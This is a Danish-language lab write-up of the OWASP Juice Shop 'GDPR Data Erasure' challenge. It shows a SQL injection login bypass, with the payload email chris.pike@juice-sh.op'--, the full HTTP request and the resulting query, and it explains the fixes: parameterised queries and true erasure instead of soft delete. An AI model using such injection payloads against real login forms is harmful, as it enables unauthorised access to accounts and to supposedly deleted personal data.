# GDPR Data Erasure (⭐⭐⭐)

**Kategori:** Broken Authentication – A07  
**Dato:** 2026-11-26  
**Miljø:** OWASP Juice Shop i Docker, Burp Suite Community  
**Status:** Løst  
**Tidsforbrug:** ca. 25 min

## Mål

Logge ind på Chris' konto, selvom den er blevet "slettet".

## Fremgangsmåde

1. **Find e-mailen.** Chris' konto er `chris.pike@juice-sh.op`.
2. **Forstå "slettet".** Kontoen er ikke fjernet fra databasen — den er kun markeret med et `deletedAt`-tidsstempel (soft delete). Rækken ligger der stadig.
3. **Omgå filteret med SQL injection.** Login-feltet er sårbart. Jeg afslutter e-mail-strengen og kommenterer resten af forespørgslen væk, så både password-tjek og `deletedAt`-filter forsvinder:

   ```
   email:    chris.pike@juice-sh.op'--
   password: test
   ```

4. **Log ind.** Jeg blev logget ind som Chris, og opgaven blev løst.

## Request

```http
POST /rest/user/login HTTP/1.1
Host: localhost:3000
Content-Type: application/json

{"email":"chris.pike@juice-sh.op'--","password":"x"}
```

Forespørgslen bliver reelt:

```sql
SELECT * FROM Users WHERE email = 'chris.pike@juice-sh.op'-- ' AND password = '...' AND deletedAt IS NULL
```

Alt efter `--` er kommentar, så kun `email`-betingelsen tæller.

## Manglende kontrol

- Login-feltet bygger SQL med string-sammensætning i stedet for parametrisering → SQL injection.
- "Sletning" er soft delete. Data findes stadig og kan hentes frem.

## Rettelse

- Parametriserede forespørgsler (prepared statements).
- Ægte erasure: slet eller anonymisér rækken, ikke bare et flag.

## Det jeg lærte

"Slettet" i en database betyder ikke altid væk. Soft delete skjuler kun data, og en SQLi kan hente det frem igen — både et auth-problem og et GDPR-problem.
